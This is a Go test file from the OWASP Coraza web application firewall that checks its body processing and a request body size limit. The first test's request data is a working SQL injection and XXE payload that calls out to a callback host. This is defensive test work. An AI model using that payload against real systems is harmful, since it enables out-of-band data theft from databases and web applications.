// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package engine

import (
	"github.com/corazawaf/coraza/v3/testing/profile"
)

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "jptosso",
		Description: "Test if the body processors work",
		Enabled:     true,
		Name:        "special_urlencoded.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "posturlencoded",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:    "/",
							Method: "POST",
							Data:   `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`,
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{100},
						},
					},
				},
			},
		},
	},
	Rules: `
SecRequestBodyAccess On
SecAction "id:1, phase:1, ctl:forceRequestBodyVariable=on"
# urlencoded_error must be set because of the invalid payload
SecRule &URLENCODED_ERROR "!@eq 0" "id: 100, log"
`,
})

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "adilalperenciftci",
		Description: "SecRequestBodyNoFilesLimit bounds forced request bodies",
		Enabled:     true,
		Name:        "requestbody_nofiles_limit.yaml",
	},
	Tests: []profile.Test{{
		Title: "reject forced binary body above no-files limit",
		Stages: []profile.Stage{{Stage: profile.SubStage{
			Input: profile.StageInput{
				URI:     "/",
				Method:  "POST",
				Headers: map[string]string{"Content-Type": "application/octet-stream"},
				Data:    "payload=ABCDEFGHIJKLMNOPQRSTUVWX",
			},
			Output: profile.ExpectedOutput{
				NonTriggeredRules: []int{2},
				Interruption:      &profile.ExpectedInterruption{Status: 413, Action: "deny"},
			},
		}}},
	}},
	Rules: `
SecRequestBodyAccess On
SecRequestBodyNoFilesLimit 16
SecRequestBodyLimitAction Reject
SecAction "id:1,phase:1,pass,nolog,ctl:forceRequestBodyVariable=On"
SecRule ARGS_POST:payload "@streq ABCDEFGHIJKLMNOPQRSTUVWX" "id:2,phase:2,pass,log"
`,
})
